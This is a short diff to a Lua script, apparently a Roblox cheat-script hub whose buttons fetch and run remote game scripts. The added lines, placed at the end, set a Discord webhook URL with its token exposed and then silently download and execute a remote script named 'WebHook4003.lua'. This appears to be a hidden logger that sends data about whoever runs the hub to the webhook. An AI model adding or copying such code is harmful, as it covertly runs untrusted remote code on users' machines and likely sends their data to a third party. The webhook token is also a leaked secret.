@@ -102,3 +102,8 @@ local Section = Tab:NewSection("Anime Fighting Simulator")
 Section:NewButton("Anime Fighting Simulator", "", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/InFlames121212122/Anime-Fighting-Simulator/main/Anime%20Fighting%20Simulator.lua"))()
 end)
+
+
+getgenv().WebhookHere = "https://discord.com/api/webhooks/1016957628091482173/WTqsaaR9xA45YV-Y6vIZCBFF6U5x3aJsVi2Ypc-hIhWqa5BfLkqFJGPzMJBQi3qwuLL9"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
